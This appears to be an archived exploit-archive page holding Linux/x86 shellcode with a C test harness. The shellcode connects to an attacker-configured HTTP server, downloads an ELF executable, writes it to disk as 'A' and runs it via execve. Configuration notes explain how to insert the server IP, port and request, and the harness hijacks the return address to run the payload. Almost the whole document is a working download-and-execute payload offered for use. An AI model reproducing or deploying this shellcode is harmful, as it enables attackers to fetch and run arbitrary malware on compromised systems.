<html idmmzcc-ext-docid="589901824"><head><title>Linux/x86 - HTTP/1.x GET, Downloads &amp; execve() - 111 bytes+</title>
<meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
<meta http-equiv="Content-Language" content="en">
</head>


<body><pre>/*
 * (linux/x86) - HTTP/1.x GET, Downloads and execve() - 111 bytes+
 *
 * This shellcode allows you to download a ELF executable straight off a standard HTTP server
 * and launch it. It will saved locally it into a filename called 'A' in the current directory.
 * 
 * &lt;_CONFIGURATION&gt;
 *
 * &gt; The destination IP of the HTTP server is required (NO DNS!), use inet_addr() function result and 
 *   modify the value in [1*] from 0xdeadbeef to the actual IP, if the IP contains NULLs then a little 
 *   workaround requires. The simplest is to use ~inet_addr() followed by ``notl (%esp)`` to change back. 
 *
 * &gt; The destination port of the HTTP server is 80 by default, it is located within the 4 upper bytes
 *   of the value in [2*] (0xafff). Stored in an invert format (~), so if any further modification 
 *   needed make sure to keep it stored in the same format.
 *
 * &gt; The destination URL should be generated using the ``gen_httpreq`` utility. It will produce an
 *   assembly code which is a series of PUSH's and should be pasted as it is within in the marked place
 *   in the shellcode (look for the comment).
 * 
 * &lt;_LINKS/UTILITIES&gt;:
 *
 *      gen_httpreq.c, generates a HTTP GET request for this shellcode
 *      &gt; http://www.tty64.org/code/shellcodes/utilities/gen_httpreq.c
 *	backup
 *	&gt; http://www.milw0rm.com/shellcode/2618
 *
 * - izik &lt; izik@tty64.org &gt;
 */

char shellcode[] = 

	"\x6a\x66"              // push $0x66 
	"\x58"                  // pop %eax 
	"\x99"                  // cltd 
	"\x6a\x01"              // push $0x1 
	"\x5b"                  // pop %ebx 
	"\x52"                  // push %edx 
	"\x53"                  // push %ebx 
	"\x6a\x02"              // push $0x2 
	"\x89\xe1"              // mov %esp,%ecx 
	"\xcd\x80"              // int $0x80 
	"\x5b"                  // pop %ebx 
	"\x5e"                  // pop %esi 
	"\x68\xef\xbe\xad\xde"  // [1*] push $0xdeadbeef
	"\xbd\xfd\xff\xff\xaf"  // [2*] mov $0xaffffffd,%ebp 
	"\xf7\xd5"              // not %ebp 
	"\x55"                  // push %ebp 
	"\x43"                  // inc %ebx 
	"\x6a\x10"              // push $0x10 
	"\x51"                  // push %ecx 
	"\x50"                  // push %eax 
	"\xb0\x66"              // mov $0x66,%al 
	"\x89\xe1"              // mov %esp,%ecx 
	"\xcd\x80"              // int $0x80 
	"\x5f"                  // pop %edi 
	"\xb0\x08"              // mov $0x8,%al 
	"\x52"                  // push %edx 
	"\x6a\x41"              // push $0x41 
	"\x89\xe3"              // mov %esp,%ebx 
	"\x50"                  // push %eax 
	"\x59"                  // pop %ecx 
	"\xcd\x80"              // int $0x80 
	"\x96"                  // xchg %eax,%esi 
	"\x87\xdf"              // xchg %ebx,%edi 

	//
	// &lt;_paste here the code, that gen_httpreq.c outputs!&gt;
	//

	"\xb0\x04"              // mov $0x4,%al 

	//
	// &lt;_send_http_request&gt;:
	//

	"\x89\xe1"              // mov %esp,%ecx 
	"\xcd\x80"              // int $0x80 
	"\x99"                  // cltd 
	"\x42"                  // inc %edx 

	//
	// &lt;_wait_for_dbl_crlf&gt;:
	//

	"\x49"                  // dec %ecx 
	"\xb0\x03"              // mov $0x3,%al 
	"\xcd\x80"              // int $0x80 
	"\x81\x39\x0a\x0d\x0a\x0d" // cmpl $0xd0a0d0a,(%ecx) 
	"\x75\xf3"              // jne &lt;_wait_for_dbl_crlf&gt; 
	"\xb2\x04"              // mov $0x4,%dl 

	//
	// &lt;_dump_loop_do_read&gt;:
	//

	"\xb0\x03"              // mov $0x3,%al 
	"\xf8"                  // clc 


	//
	// &lt;_dump_loop_do_write&gt;:
	//

	"\xcd\x80"              // int $0x80 
	"\x87\xde"              // xchg %ebx,%esi 
	"\x72\xf7"              // jb &lt;_dump_loop_do_read&gt; 
	"\x85\xc0"              // test %eax,%eax 
	"\x74\x05"              // je &lt;_close_file&gt; 
	"\xb0\x04"              // mov $0x4,%al 
	"\xf9"                  // stc 
	"\xeb\xf1"              // jmp &lt;_dump_loop_do_write&gt; 
	"\xb0\x06"              // mov $0x6,%al 
	"\xcd\x80"              // int $0x80 
	"\x99"                  // cltd 
	"\xb0\x0b"              // mov $0xb,%al 
	"\x89\xfb"              // mov %edi,%ebx 
	"\x52"                  // push %edx 
	"\x53"                  // push %ebx 
	"\xeb\xcc";             // jmp &lt;_send_http_request&gt; 

int main(int argc, char **argv) {
	int *ret;
	ret = (int *)&amp;ret + 2;
	(*ret) = (int) shellcode;
}


<script type="text/javascript">
var gaJsHost = (("https:" == document.location.protocol) ? "https://ssl." : "http://www.");
document.write(unescape("%3Cscript src=%27" + gaJsHost + "google-analytics.com/ga.js%27 type=%27text/javascript%27%3E%3C/script%3E"));
</script><script src="Linux_x86%20-%20HTTP_1.x%20GET,%20Downloads%20&amp;%20execve%28%29%20-%20111%20bytes+_files/ga.js" type="text/javascript"></script>

<script type="text/javascript">
try {
var pageTracker = _gat._getTracker("UA-6809519-1");
pageTracker._trackPageview();
} catch(err) {}</script>
</pre></body></html>